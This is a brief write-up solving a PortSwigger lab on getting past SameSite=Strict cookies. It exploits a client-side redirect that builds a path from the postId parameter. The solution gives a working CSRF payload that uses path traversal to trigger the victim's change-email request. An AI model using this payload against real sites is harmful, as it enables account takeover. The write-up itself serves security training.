# [Lab: SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

## Lab

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: `wiener:peter`

## Analysis

session cookie: samesite=strict.

request:

```http
GET /post/comment/confirmation?postId=3 HTTP/1.1
```

response:

```js
<script>redirectOnConfirmation('/post');</script>
```

content of js function:

```js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

## Solutions

use tthe redirect function to bypass samesite=strict to csrf:

```html
<script>
document.location = "https://id.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=hacked@gmail.com%26submit=1";
</script>
```

we need to encode `&` once to `%26`.
